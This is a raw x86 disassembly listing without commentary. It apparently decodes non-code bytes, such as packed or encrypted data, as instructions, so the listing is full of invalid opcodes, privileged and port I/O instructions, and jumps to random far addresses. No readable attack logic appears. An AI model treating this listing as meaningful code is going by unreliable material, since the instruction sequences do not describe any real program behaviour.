  4244f4:	jge    0x424559
  4244f6:	jmp    0x42447f
  4244f8:	or     BYTE PTR [ebx],0x29
  4244fb:	js     0x424527
  4244fd:	or     ah,dl
  4244ff:	scas   al,BYTE PTR es:[edi]
  424500:	inc    esp
  424501:	dec    edi
  424502:	inc    esi
  424503:	sub    eax,0x422055eb
  424508:	idiv   DWORD PTR [ebx+0x6b]
  42450b:	dec    ebx
  42450c:	punpckhwd mm3,QWORD PTR [esi]
  42450f:	adc    ecx,edx
  424511:	and    dh,BYTE PTR [ebx]
  424513:	(bad)  
  424514:	sbb    al,0x12
  424516:	mov    al,0x3f
  424518:	adc    DWORD PTR [edx],0xe777b3bd
  42451e:	(bad)  
  42451f:	(bad)  
  424520:	adc    al,0x57
  424522:	mov    ebp,0xc8696e73
  424527:	call   0xea70cd32
  42452c:	fdiv   DWORD PTR [esi+0x5e]
  42452f:	(bad)  
  424530:	int3   
  424531:	dec    eax
  424532:	push   es
  424533:	jecxz  0x4245a5
  424535:	imul   eax,DWORD PTR [ebp+0x564dab97],0xffffffcd
  42453c:	mov    bh,BYTE PTR ds:0xa8ca65a4
  424542:	or     DWORD PTR [ecx],esp
  424544:	test   eax,0xd41963af
  424549:	(bad)  
  42454b:	mov    ah,0xec
  42454d:	xlat   BYTE PTR ds:[ebx]
  42454e:	xchg   esi,eax
  42454f:	scas   eax,DWORD PTR es:[edi]
  424550:	push   ebp
  424551:	mov    dl,0xa8
  424553:	test   BYTE PTR [edi],bh
  424555:	inc    ebx
  424556:	leave  
  424557:	dec    ecx
  424558:	inc    edx
  424559:	cs jmp 0xef122a5b
  42455f:	outs   dx,BYTE PTR ds:[esi]
  424560:	sub    BYTE PTR [ebp+eiz*4-0x2eba2acf],ch
  424567:	shl    edi,1
  424569:	jb     0x4245af
  42456b:	hlt    
  42456c:	mov    dl,0xf5
  42456e:	sbb    edx,DWORD PTR [esi-0x5f]
  424571:	cmp    eax,0x43
  424574:	cmp    esp,DWORD PTR [esp+ebp*2+0x6d]
  424578:	shl    BYTE PTR [ebp+0x2],0xc5
  42457c:	mov    ebx,0x358f738f
  424581:	in     eax,0x4f
  424583:	stos   DWORD PTR es:[edi],eax
  424584:	aaa    
  424585:	mov    BYTE PTR [ebp+0x26],al
  424588:	rcr    DWORD PTR [ebp+0x3bcf9d7],1
  42458e:	test   DWORD PTR [ebp+eax*8-0x4d],eax
  424592:	arpl   WORD PTR [esi-0x51cd0b5e],sp
  424598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424599:	mov    dh,0x5
  42459b:	jb     0x4245ad
  42459d:	fwait
  42459e:	sub    ch,bh
  4245a0:	or     ecx,DWORD PTR [eax+0xcd223f4]
  4245a6:	imul   edx,DWORD PTR [ebp-0x7c11e71e],0xfed0f4
	...
  4245b8:	add    BYTE PTR [eax],al
  4245ba:	push   cs
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax+0x6dfdbcb7]
  4245c9:	sub    DWORD PTR [esi-0x2fffe42],0x1
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	addr16 into 
  4245d4:	sub    DWORD PTR [edi],eax
  4245d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d7:	and    DWORD PTR [eax-0x22],edx
  4245da:	pop    ecx
  4245db:	test   DWORD PTR [ecx+0x56904b50],ebx
  4245e1:	pop    ebx
  4245e2:	xor    BYTE PTR [ecx],bl
  4245e4:	push   0x6552e454
  4245e9:	mov    edi,0x24033734
  4245ee:	arpl   WORD PTR [ebp+0x66],di
  4245f1:	ret    
  4245f2:	jne    0x4245cb
  4245f4:	cdq    
  4245f5:	fistp  QWORD PTR [ebx]
  4245f7:	mov    ch,0xaa
  4245f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245fa:	jl     0x42465c
  4245fc:	pusha  
  4245fd:	leave  
  4245fe:	test   BYTE PTR [ebp+0x64330bc1],al
  424604:	inc    edi
  424605:	inc    ebx
  424606:	push   eax
  424607:	jmp    0x42461b
  424609:	mov    ebp,0x82e8c305
  42460e:	pusha  
  42460f:	or     DWORD PTR [esi-0xc],esp
  424612:	cmp    eax,0x207bcba7
  424617:	xor    DWORD PTR [esi],esi
  424619:	clc    
  42461a:	jle    0x4245db
  42461c:	mov    BYTE PTR [esi],bl
  42461e:	adc    BYTE PTR ds:0xb592a359,0x92
  424625:	in     eax,0xd7
  424627:	pop    ecx
  424628:	imul   ebp,esi,0x1c
  42462b:	xchg   ecx,eax
  42462c:	mov    DWORD PTR [edx],0x66b26e3
  424632:	push   esi
  424633:	ja     0x4246b4
  424635:	mov    ecx,0xcff7a18e
  42463a:	into   
  42463b:	repnz mov cl,0xe
  42463e:	ins    DWORD PTR es:[edi],dx
  42463f:	adc    DWORD PTR [esi],esi
  424641:	or     eax,edi
  424643:	fist   WORD PTR [ebx]
  424645:	test   al,0xf2
  424647:	mov    edi,0x89cbaa80
  42464c:	fiadd  WORD PTR [ecx]
  42464e:	pop    ecx
  42464f:	out    0x15,al
  424651:	sub    dl,bl
  424653:	mov    al,0xba
  424655:	jnp    0x4246bc
  424657:	scas   eax,DWORD PTR es:[edi]
  424658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424659:	mov    ax,0xd8ad
  42465d:	mov    al,0x77
  42465f:	sbb    eax,0x6f0906a7
  424664:	xchg   ebx,eax
  424665:	push   ecx
  424666:	xchg   ebp,eax
  424667:	jl     0x424667
  424669:	jmp    0xe262:0xa4f8988c
  424670:	fisubr WORD PTR [ecx+0x16e2bf40]
  424676:	and    ecx,ecx
  424678:	xchg   ebx,eax
  424679:	pop    es
  42467a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42467b:	pop    esp
  42467c:	xchg   DWORD PTR [esi+0x59],esp
  42467f:	jb     0x424654
  424681:	cmp    DWORD PTR [ebp-0x1142daef],esi
  424687:	pop    edx
  424688:	jge    0x4246c5
  42468a:	mov    ebx,0x289bbf6a
  42468f:	out    dx,al
  424690:	jbe    0x4246a6
  424692:	in     eax,0x92
  424694:	(bad)  
  424695:	int3   
  424696:	xchg   BYTE PTR [esp+ebp*4-0x6b],cl
  42469a:	mov    dh,0xfb
  42469c:	adc    BYTE PTR [esi+0x15],0x87
  4246a0:	cmp    al,0xdf
  4246a2:	sub    al,0x8a
  4246a4:	icebp  
  4246a5:	rol    BYTE PTR [edi+0xc],1
  4246a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246a9:	jns    0x424707
  4246ab:	syscall 
  4246ad:	mov    eax,ds:0x450ef4d
  4246b2:	jecxz  0x4246aa
  4246b4:	cld    
  4246b5:	les    esp,FWORD PTR [ecx+ebx*1+0x63]
  4246b9:	mov    bh,0x7
  4246bb:	push   0xaeb3c0cf
  4246c0:	and    BYTE PTR [esi+0x79],bl
  4246c3:	outs   dx,DWORD PTR gs:[esi]
  4246c5:	pop    ebx
  4246c6:	push   eax
  4246c7:	mov    ecx,0x702f02cf
  4246cc:	ror    DWORD PTR [edi+0x39affe0],0x17
  4246d3:	sbb    eax,0x32ed82f4
  4246d8:	jno    0x424671
  4246da:	call   0x16dd9b7e
  4246df:	push   cs
  4246e0:	pop    ds
  4246e1:	push   es
  4246e2:	mov    bh,bh
  4246e4:	data16 je 0x4246d3
  4246e7:	mov    WORD PTR [ecx-0x659bca73],es
  4246ed:	mov    DWORD PTR [ecx+0x74d60ad9],0x9cddc8ad
  4246f7:	inc    ebx
  4246f8:	pushf  
  4246f9:	adc    DWORD PTR [ecx+0x6ebabbbe],ebp
  4246ff:	std    
  424700:	push   cs
  424701:	and    DWORD PTR [ebx+ebx*1+0x67900a85],0xd
  424709:	(bad)  
  42470a:	loopne 0x424740
  42470c:	xor    DWORD PTR ds:0xf35ebce,0xca894c9a
  424716:	test   al,0xea
  424718:	retf   0xf041
  42471b:	cmp    BYTE PTR [ebp-0x339dfe27],0x40
  424722:	shl    DWORD PTR ds:0x8dfd1166,0x47
  424729:	test   DWORD PTR [eax],edx
  42472b:	sbb    eax,0xa5349ab4
  424730:	ja     0x4246f1
  424732:	mov    ebx,0x6f671925
  424737:	ja     0x424707
  424739:	retf   0x5286
  42473c:	mov    ch,0x51
  42473e:	ret    
  42473f:	push   cs
  424740:	ins    BYTE PTR es:[edi],dx
  424741:	loopne 0x424779
  424743:	jmp    0x4246d5
  424745:	lock sbb DWORD PTR ds:0x97e37f57,ebx
  42474c:	mov    bl,0xc7
  42474e:	or     edi,DWORD PTR [esi-0x4ca43846]
  424754:	or     bh,bh
  424756:	pop    ebp
  424757:	jbe    0x424764
  424759:	(bad)  
  42475a:	cwde   
  42475b:	rol    eax,1
  42475d:	add    eax,0x1e6a8126
  424762:	pop    esi
  424763:	aas    
  424764:	out    dx,eax
  424765:	mov    WORD PTR [ecx+ebx*2],gs
  424768:	mov    cl,0x25
  42476a:	or     al,0x17
  42476c:	in     al,0xb3
  42476e:	mov    ch,0xb6
  424770:	hlt    
  424771:	pop    ebp
  424772:	push   cs
  424773:	jo     0x4247b0
  424775:	lods   eax,DWORD PTR ds:[esi]
  424776:	out    0x3f,eax
  424778:	std    
  424779:	inc    eax
  42477a:	test   BYTE PTR [edi-0x1e],0xff
  42477e:	mov    edi,DWORD PTR [ebx-0x1d]
  424781:	xor    bl,ch
  424783:	cmp    bl,BYTE PTR [esi]
  424785:	fbld   TBYTE PTR [ecx+ebp*1-0x1a1699c]
  42478c:	cmp    DWORD PTR [ebp+0x462598bb],edi
  424792:	push   edx
  424793:	sub    ch,BYTE PTR [ebp-0x49]
  424796:	mov    BYTE PTR [edi],bh
  424798:	into   
  424799:	rcl    BYTE PTR [edx],0x8f
  42479c:	jl     0x42475b
  42479e:	push   ebp
  42479f:	and    dh,BYTE PTR [esp]
  4247a2:	out    dx,al
  4247a3:	cmc    
  4247a4:	in     al,0x5
  4247a6:	into   
  4247a7:	mov    ch,BYTE PTR [edx]
  4247a9:	sbb    bl,ah
  4247ab:	sub    eax,DWORD PTR [ebx]
  4247ad:	retf   
  4247ae:	bnd je 0x424742
  4247b1:	add    eax,0x85146bb
  4247b6:	sub    DWORD PTR [ecx-0x38ee7b4],ebx
  4247bc:	das    
  4247bd:	push   0x37b55710
  4247c2:	pop    ss
  4247c3:	sub    bh,BYTE PTR [edx-0x446ae1d4]
  4247c9:	inc    eax
  4247ca:	mov    ebp,0xa26bfb95
	...
  4247d7:	add    BYTE PTR [eax],al
  4247d9:	add    BYTE PTR [edi+edi*4+0x63],bl
  4247dd:	push   eax
  4247de:	jecxz  0x4247bc
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0x96
  4247e7:	mov    al,ds:0xc0ab6065
  4247ec:	add    DWORD PTR [eax],eax
  4247ee:	std    
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    BYTE PTR [esi+ecx*8],al
  4247f4:	cmp    DWORD PTR [ebx],eax
  4247f6:	inc    edi
  4247f7:	sbb    ah,BYTE PTR [eax]
  4247f9:	jo     0x4247b0
  4247fb:	mov    ds:0xcb4733bd,eax
  424800:	test   ah,cl
  424802:	int    0xe8
  424804:	hlt    
  424805:	loope  0x42481e
  424807:	and    DWORD PTR [ebx],ebx
  424809:	stos   BYTE PTR es:[edi],al
  42480a:	sbb    dh,BYTE PTR [esi-0x42]
  42480d:	or     cl,BYTE PTR [edi]
  42480f:	mov    al,0xe6
  424811:	or     ecx,DWORD PTR [esi]
  424813:	inc    esi
  424814:	pmulhuw mm1,QWORD PTR [ebx*8-0x4e6c5813]
  42481c:	inc    ebx
  42481d:	xor    eax,0x946c1f6
  424822:	inc    esi
  424823:	cmp    dh,dh
  424825:	loope  0x424893
  424827:	scas   al,BYTE PTR es:[edi]
  424828:	pop    eax
  424829:	in     eax,dx
  42482a:	rol    DWORD PTR [ebp+0x23],1
  42482d:	xchg   BYTE PTR [edx-0x678b91fd],dl
  424833:	xchg   DWORD PTR [eax+0x34],esi
  424836:	dec    ecx
  424837:	outs   dx,BYTE PTR ds:[esi]
  424838:	jmp    0x309b:0xcc3e0451
  42483f:	push   esp
  424840:	test   eax,0xbe73c74f
  424845:	add    eax,0xc8d40891
  42484a:	shl    BYTE PTR [esi],0x3f
  42484d:	popa   
  42484e:	ss inc edx
  424850:	pop    ebp
  424851:	(bad)  
  424852:	cmp    edi,eax
  424854:	fdiv   DWORD PTR ds:0x2e63e8f6
  42485a:	push   es
  42485b:	clc    
  42485c:	imul   ecx,DWORD PTR [edx+0x9],0xa755d0e9
  424863:	fsub   DWORD PTR [eax+esi*2-0x578030d6]
  42486a:	dec    eax
  42486b:	call   0xd3e6:0xdd76ebdf
  424872:	cld    
  424873:	lea    ebp,[edx]
  424875:	add    eax,0x34371b59
  42487a:	(bad)  
  42487b:	retw   
  42487d:	data16 jb 0x424894
  424880:	data16 arpl cx,dx
  424883:	ds mov edi,0x876fb643
  424889:	jne    0x42487c
  42488b:	inc    eax
  42488c:	ret    0x5ff
  42488f:	test   eax,0x665c8205
  424894:	mov    eax,0x5620d81d
  424899:	jo     0x424864
  42489b:	dec    eax
  42489c:	xor    BYTE PTR [esi-0xb],al
  42489f:	inc    ebp
  4248a0:	int3   
  4248a1:	mov    DWORD PTR [eax+0x406ecf90],eax
  4248a7:	into   
  4248a8:	or     cl,bl
  4248aa:	mov    esi,0xd3ca8b4b
  4248af:	sbb    eax,0x6e2368c7
  4248b5:	out    dx,al
  4248b6:	loope  0x4248d3
  4248b8:	sbb    DWORD PTR [ebp-0x7ed9d286],edi
  4248be:	cmp    ebp,edx
  4248c0:	dec    ebp
  4248c1:	push   ebp
  4248c2:	jp     0x4248cd
  4248c4:	(bad)  
  4248c5:	(bad)  
  4248c6:	push   ds
  4248c7:	inc    edi
  4248c8:	mov    bh,0x7d
  4248ca:	daa    
  4248cb:	imul   DWORD PTR [edx-0xd]
  4248ce:	and    eax,0x1249aee2
  4248d3:	fldcw  WORD PTR [eax]
  4248d5:	jno    0x424891
  4248d7:	adc    ebp,DWORD PTR [esi-0x70375da1]
  4248dd:	(bad)  
  4248de:	stos   DWORD PTR es:[edi],eax
  4248df:	inc    ecx
  4248e0:	es loop 0x424864
  4248e3:	mov    WORD PTR [ecx+0x31],?
  4248e6:	push   esp
  4248e7:	fldenv [ecx]
  4248e9:	fwait
  4248ea:	cmp    DWORD PTR [ebx],0xd02902f9
  4248f0:	mov    edi,0xc7396749
  4248f5:	iret   
  4248f6:	and    DWORD PTR [edx-0x80],ebx
  4248f9:	hlt    
  4248fa:	iret   
  4248fb:	cld    
  4248fc:	jne    0x4248a0
  4248fe:	cmp    DWORD PTR [ebp+0x299c0904],esi
  424904:	xchg   ecx,eax
  424905:	fimul  WORD PTR [ebx+ebp*1]
  424908:	push   ds
  424909:	or     BYTE PTR [esi+0x5d],bl
  42490c:	mov    esi,0x1d5ac966
  424911:	lods   eax,DWORD PTR ds:[esi]
  424912:	pop    eax
  424913:	push   ss
  424914:	adc    ch,BYTE PTR [esi+0x43]
  424917:	outs   dx,DWORD PTR ds:[esi]
  424918:	aam    0xd1
  42491a:	call   FWORD PTR [eax+esi*1-0x75230780]
  424921:	add    ch,BYTE PTR [eax-0x26]
  424924:	jle    0x4248fb
  424926:	xlat   BYTE PTR ds:[ebx]
  424927:	mov    WORD PTR [edi+0x7c7869aa],gs
  42492d:	sbb    DWORD PTR [ecx+0x6f],ecx
  424930:	(bad)  [ebx-0x7924abc7]
  424936:	cmp    ecx,0xffffffc1
  424939:	add    edx,DWORD PTR [eax+0x7c22f83a]
  42493f:	push   0x8
  424941:	xchg   edi,eax
  424942:	adc    al,0x62
  424944:	adc    edx,DWORD PTR [esi-0x6856c49c]
  42494a:	xchg   BYTE PTR [eax+0x1d],ah
  42494d:	cmc    
  42494e:	pop    eax
  42494f:	call   0x4194d507
  424954:	test   al,0x85
  424956:	sub    eax,0x23e31d67
  42495b:	xor    ebx,esp
  42495d:	mov    bh,0x51
  42495f:	pop    ebx
  424960:	loope  0x4248fc
  424962:	xor    ebx,DWORD PTR [esi-0x53]
  424965:	dec    edx
  424966:	retf   0x61e2
  424969:	cli    
  42496a:	sbb    eax,0x4e1d54e8
  42496f:	xchg   edi,eax
  424970:	rcr    BYTE PTR [edi],cl
  424972:	loop   0x424959
  424974:	lds    ecx,FWORD PTR [edi-0x10]
  424977:	(bad)  
  424978:	retf   0x541e
  42497b:	xchg   esp,eax
  42497c:	jbe    0x424959
  42497e:	shl    ah,0x8a
  424981:	lea    edx,[edi-0x67]
  424984:	shl    edx,0x5
  424987:	push   ebp
  424988:	adc    dh,cl
  42498a:	mov    dl,0xc3
  42498c:	jl     0x424973
  42498e:	adc    eax,0x199a0440
  424993:	sbb    DWORD PTR [edx+0x74],edi
  424996:	dec    DWORD PTR [esi]
  424998:	shl    BYTE PTR [ebx+0x2a],0x2
  42499c:	rcl    BYTE PTR [ebp-0x258e4ae],cl
  4249a2:	out    0xb3,eax
  4249a4:	xor    edi,esi
  4249a6:	in     eax,0xa1
  4249a8:	adc    DWORD PTR [ebx-0x7721086a],esi
  4249ae:	jg     0x4249dc
  4249b0:	sub    al,0x1a
  4249b2:	outs   dx,DWORD PTR ds:[esi]
  4249b3:	mov    DWORD PTR [ebp-0x20],ecx
  4249b6:	cwde   
  4249b7:	push   ss
  4249b8:	gs mov bh,0xf5
  4249bb:	add    BYTE PTR [esi-0x2d],cl
  4249be:	fidiv  DWORD PTR ds:0x31f1560
  4249c4:	jb     0x424988
  4249c6:	pop    edx
  4249c7:	icebp  
  4249c8:	aam    0x4c
  4249ca:	call   0xfbb9:0x12dad5f7
  4249d1:	adc    ch,ch
  4249d3:	imul   edi,DWORD PTR [esi-0x2f],0xffffffd9
  4249d7:	cwde   
  4249d8:	sti    
  4249d9:	in     eax,0x6
  4249db:	inc    ax
  4249dd:	dec    ebp
  4249de:	scas   eax,DWORD PTR es:[edi]
  4249df:	stc    
  4249e0:	rcl    DWORD PTR [ecx+0x36],cl
  4249e3:	dec    esi
  4249e4:	shl    ebx,0x1
  4249e7:	mov    al,ds:0xb3df8320
  4249ec:	cwde   
  4249ed:	xchg   ebp,eax
  4249ee:	sahf   
	...
  4249f7:	add    BYTE PTR [eax],al
  4249f9:	add    BYTE PTR [ebx+0x55],al
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	mov    al,0xdd
  424a08:	test   eax,0x1c2a874
  424a0d:	add    ch,bh
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    BYTE PTR [edx],cl
  424a13:	mov    bh,0xb8
  424a15:	hlt    
  424a16:	adc    esp,DWORD PTR [ebp+0x10]
  424a19:	mov    cl,0x2a
  424a1b:	ds data16 cld 
  424a1e:	mov    fs,eax
  424a20:	xlat   BYTE PTR ds:[ebx]
  424a21:	loopne 0x424a16
  424a23:	imul   esp,DWORD PTR [eax-0x1e2d35f9],0xffffffb9
  424a2a:	push   esi
  424a2b:	cmc    
  424a2c:	or     DWORD PTR [edi-0x44],ebx
  424a2f:	(bad)  
  424a30:	retf   0xdf77
  424a33:	jmp    0x7b8c0a3e
  424a38:	popa   
  424a39:	push   es
  424a3a:	jnp    0x424a40
  424a3c:	cli    
  424a3d:	mov    ss,WORD PTR [edi-0x2883cce7]
  424a43:	test   al,0xae
  424a45:	sub    eax,DWORD PTR [ecx]
  424a47:	es add eax,0x60604561
  424a4d:	jle    0x424aba
  424a4f:	iret   
  424a50:	and    al,0x1c
  424a52:	test   BYTE PTR [esi+ebx*4+0x41],bh
  424a56:	push   0x50c04e75
  424a5b:	sbb    BYTE PTR fs:[edi+ebp*8+0x6d9f1c42],bh
  424a63:	inc    edx
  424a64:	adc    BYTE PTR [esi-0x66],ah
  424a67:	fsub   QWORD PTR [edi-0x51]
  424a6a:	add    bh,BYTE PTR [ebp-0x7e]
  424a6d:	jge    0x424a58
  424a6f:	sub    al,BYTE PTR [ebp-0x6af7ca45]
  424a75:	and    eax,0xff64c705
  424a7a:	pop    ebp
  424a7b:	(bad)  
  424a7d:	jnp    0x424a82
  424a7f:	xchg   ebp,eax
  424a80:	bound  esi,QWORD PTR [esi-0x63820625]
  424a86:	jne    0x3e8b2fe
  424a8c:	test   al,0x93
  424a8e:	mov    ah,0x88
  424a90:	xor    eax,DWORD PTR ds:0x38f3903c
  424a96:	push   esi
  424a97:	pop    esi
  424a98:	xchg   ebp,eax
  424a99:	and    ah,BYTE PTR [edi+ebx*1]
  424a9c:	cmc    
  424a9d:	jp     0x424a37
  424a9f:	outs   dx,BYTE PTR ds:[esi]
  424aa0:	std    
  424aa1:	div    BYTE PTR [ebx-0x5edb2749]
  424aa7:	ror    BYTE PTR [esi],1
  424aa9:	and    ch,bl
  424aab:	jmp    0x424ab9
  424aad:	sar    DWORD PTR [esi-0x238eb94b],cl
  424ab3:	(bad)  
  424ab4:	sbb    DWORD PTR [edi-0x3e740ff3],ebx
  424aba:	mov    DWORD PTR [ecx-0xd],esi
  424abd:	fwait
  424abe:	enter  0xca55,0x77
  424ac2:	sar    BYTE PTR [ebx],1
  424ac4:	sahf   
  424ac5:	lods   eax,DWORD PTR ds:[esi]
  424ac6:	jl     0x424b1d
  424ac8:	mov    edi,0x78c908a8
  424acd:	dec    edi
  424ace:	cmp    ah,BYTE PTR [ecx]
  424ad0:	jns    0x424ae2
  424ad2:	xor    edx,0xffffff86
  424ad5:	icebp  
  424ad6:	jecxz  0x424a82
  424ad8:	std    
  424ad9:	or     BYTE PTR [eax],bl
  424adb:	lock hlt 
  424add:	dec    ebx
  424ade:	data16 inc BYTE PTR [ecx-0x5142c20f]
  424ae5:	sbb    al,0xbd
  424ae7:	mov    al,0x63
  424ae9:	data16 gs jle 0x424aeb
  424aed:	leave  
  424aee:	jmp    0x20257a9d
  424af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424af4:	xor    BYTE PTR [ecx+ebx*1],dl
  424af7:	pop    edx
  424af8:	push   edx
  424af9:	inc    esp
  424afa:	addr16 aaa 
  424afc:	ds or  eax,0x5492900a
  424b02:	push   0x571fd609
  424b07:	adc    cl,bh
  424b09:	sub    al,0x5
  424b0b:	(bad)  
  424b0c:	xlat   BYTE PTR ds:[ebx]
  424b0d:	xchg   esp,eax
  424b0e:	rol    BYTE PTR [eax],1
  424b10:	pop    es
  424b11:	(bad)  
  424b12:	cli    
  424b13:	push   esp
  424b14:	ss jnp 0x424ad1
  424b17:	adc    eax,DWORD PTR [edi+eiz*2+0x63e5a99d]
  424b1e:	add    eax,0x420bf254
  424b23:	pop    ebx
  424b24:	jno    0x424b4f
  424b26:	xor    ecx,ebx
  424b28:	cmp    eax,0xf6eb238f
  424b2d:	enter  0x3e80,0xc7
  424b31:	scas   al,BYTE PTR es:[edi]
  424b32:	sub    esp,esp
  424b34:	out    dx,al
  424b35:	jo     0x424b38
  424b37:	addr16 icebp 
  424b39:	mov    ebp,0xc49b3614
  424b3e:	inc    ebx
  424b3f:	inc    ebx
  424b40:	jg     0x424afb
  424b42:	test   eax,0xdb045bb3
  424b47:	and    al,dh
  424b49:	popa   
  424b4a:	fisttp QWORD PTR [edi-0x5]
  424b4d:	mov    esp,0x7493cf2b
  424b52:	ret    
  424b53:	into   
  424b54:	ss pop ebp
  424b56:	jge    0x424afa
  424b58:	push   ss
  424b59:	cs ds in al,0x93
  424b5d:	cs push edi
  424b5f:	sub    al,BYTE PTR [ebp+0x4cf87995]
  424b65:	xor    al,0xd
  424b67:	xchg   esi,eax
  424b68:	mov    eax,eax
  424b6a:	clc    
  424b6b:	and    DWORD PTR [edi],ecx
  424b6d:	mov    edx,0xe4d04c94
  424b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b73:	mov    dh,0x97
  424b75:	in     al,0xd1
  424b77:	(bad)  
  424b78:	stos   BYTE PTR es:[edi],al
  424b79:	fistp  QWORD PTR [eax+0x40]
  424b7c:	imul   ecx,DWORD PTR [ebp-0x11],0xffffff92
  424b80:	xchg   esp,eax
  424b81:	fidivr DWORD PTR [esi-0x67]
  424b84:	push   esi
  424b85:	sub    bl,cl
  424b87:	push   ss
  424b88:	jns    0x424b52
  424b8a:	scas   eax,DWORD PTR es:[edi]
  424b8b:	xchg   edi,eax
  424b8c:	test   BYTE PTR ds:0x2399e5fb,dl
  424b92:	or     al,0xff
  424b94:	push   esp
  424b95:	push   eax
  424b96:	add    al,0xcb
  424b98:	mov    dl,0x63
  424b9a:	sbb    dl,BYTE PTR [edx+0x62]
  424b9d:	sti    
  424b9e:	xchg   esp,eax
  424b9f:	sub    ah,dl
  424ba1:	test   BYTE PTR [eax+0x21f845c3],al
  424ba7:	dec    edi
  424ba8:	pop    esi
  424ba9:	push   eax
  424baa:	or     BYTE PTR [esi-0x4b7753b9],al
  424bb0:	add    ch,ah
  424bb2:	adc    ch,0xe6
  424bb5:	sub    BYTE PTR [ebx-0x5786cce8],al
  424bbb:	adc    esi,0x6a2689a1
  424bc1:	sbb    BYTE PTR [edx],0x29
  424bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bc5:	dec    edx
  424bc6:	bnd jb 0x424c39
  424bc9:	aad    0x97
  424bcb:	push   ebx
  424bcc:	dec    esi
  424bcd:	out    0x9d,al
  424bcf:	mov    DWORD PTR [edi+0x4b5d30bd],esi
  424bd5:	(bad)  
  424bd6:	mov    ch,0xf1
  424bd8:	arpl   WORD PTR [ebx-0x66],dx
  424bdb:	rol    al,cl
  424bdd:	sbb    al,0x8f
  424bdf:	pop    eax
  424be0:	ins    BYTE PTR es:[edi],dx
  424be1:	fist   WORD PTR [ebx]
  424be3:	push   es
  424be4:	fst    DWORD PTR [esi-0x320ba466]
  424bea:	out    0x49,al
  424bec:	daa    
  424bed:	push   esp
  424bee:	pop    ebp
  424bef:	add    bh,BYTE PTR [ecx+0x6b]
  424bf2:	lds    eax,FWORD PTR [ebx-0x433ffef]
  424bf8:	fistp  DWORD PTR [edi+esi*8]
  424bfb:	hlt    
  424bfc:	into   
  424bfd:	and    al,ch
  424bff:	lea    ebp,[eax]
  424c01:	add    ch,ah
  424c03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c04:	inc    esi
  424c05:	mov    ebp,0x4bb01d8
  424c0a:	mov    ?,WORD PTR [edx]
  424c0c:	jae    0x424c3c
  424c0e:	jecxz  0x424c10
	...
  424c18:	add    BYTE PTR [eax],al
  424c1a:	push   edi
  424c1b:	sub    eax,0xba7f9a07
  424c20:	fucomip st,st(5)
  424c22:	addr16 jmp 0xac79808f
  424c28:	push   ebp
  424c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c2b:	les    eax,FWORD PTR [ecx]
  424c2d:	add    ch,bh
  424c2f:	add    DWORD PTR [eax],eax
  424c31:	add    BYTE PTR [ecx+ebp*4+0x2f],dh
  424c35:	dec    ebp
  424c36:	in     al,dx
  424c37:	fstp   TBYTE PTR [ecx]
  424c39:	popf   
  424c3a:	jne    0x424c76
  424c3c:	inc    esi
  424c3d:	push   eax
  424c3e:	jbe    0x424cbf
  424c40:	lods   al,BYTE PTR ds:[esi]
  424c41:	outs   dx,BYTE PTR ds:[esi]
  424c42:	sbb    eax,0xa67f53a7
  424c47:	mov    ds:0x27ae66d5,al
  424c4c:	aad    0xe6
  424c4e:	dec    edi
  424c4f:	jmp    0x453e:0xbdc17f15
  424c56:	out    0xec,al
  424c58:	call   0xa2b0bf23
  424c5d:	leave  
  424c5e:	sub    eax,0xb43bb5e9
  424c63:	neg    DWORD PTR [edi]
  424c65:	aas    
  424c66:	inc    ebp
  424c67:	mov    ebp,0x4c6389f2
  424c6c:	sbb    eax,0xcd709181
  424c71:	jge    0x424bf9
  424c73:	or     eax,ebx
  424c75:	cdq    
  424c76:	inc    ecx
  424c77:	inc    ebx
  424c78:	adc    DWORD PTR [esi+0x4481884b],ebx
  424c7e:	push   ebx
  424c7f:	dec    ebx
  424c80:	es in  al,0x3b
  424c83:	mov    BYTE PTR [ecx+0x39],dl
  424c86:	sahf   
  424c87:	scas   eax,DWORD PTR es:[edi]
  424c88:	cmp    DWORD PTR [edx-0x43a8a23f],esp
  424c8e:	cwde   
  424c8f:	ins    DWORD PTR es:[edi],dx
  424c90:	js     0x424c94
  424c92:	hlt    
  424c93:	ja     0x424ce9
  424c95:	add    ch,BYTE PTR [ecx-0x36]
  424c98:	aaa    
  424c99:	out    dx,al
  424c9a:	mov    eax,ds:0x73d66cae
  424c9f:	inc    esp
  424ca0:	pop    es
  424ca1:	ja     0x424d21
  424ca3:	inc    esp
  424ca4:	add    ebp,ecx
  424ca6:	push   ebx
  424ca7:	js     0x424d1e
  424ca9:	or     al,0xb0
  424cab:	in     eax,0x54
  424cad:	push   edx
  424cae:	xor    DWORD PTR [eax+0x1a4506d7],ebx
  424cb4:	dec    ebx
  424cb5:	aad    0xa1
  424cb7:	push   esp
  424cb8:	mov    BYTE PTR [ebp+0x62],cl
  424cbb:	mov    BYTE PTR [edx-0x49],ah
  424cbe:	aad    0xf8
  424cc0:	pusha  
  424cc1:	xor    DWORD PTR [esi-0x1],esi
  424cc4:	sub    BYTE PTR [ebp+0x47ac7097],ch
  424cca:	(bad)  
  424ccb:	bound  ebx,QWORD PTR [ebx]
  424ccd:	out    dx,eax
  424cce:	add    al,0xc1
  424cd0:	call   0xe17:0x674023e8
  424cd7:	fistp  WORD PTR [ebp+0x3689fdf2]
